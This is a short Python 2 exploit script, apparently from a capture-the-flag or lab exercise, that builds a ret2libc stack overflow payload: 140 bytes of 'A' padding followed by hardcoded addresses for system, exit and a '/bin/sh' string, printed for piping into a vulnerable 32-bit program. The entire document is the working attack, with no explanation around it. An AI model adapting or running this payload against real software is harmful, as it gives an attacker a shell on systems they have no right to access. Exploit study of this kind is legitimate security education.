#!/usr/bin/python2

offset = 140
junk = b"A" * offset

addr_system = b"\xb0\xc7\xc4\xf7"
addr_exit = b"\x40\xbc\xc3\xf7"
addr_bin_sh = b"\xaa\x5f\xdb\xf7"

print(junk + addr_system + addr_exit + addr_bin_sh)
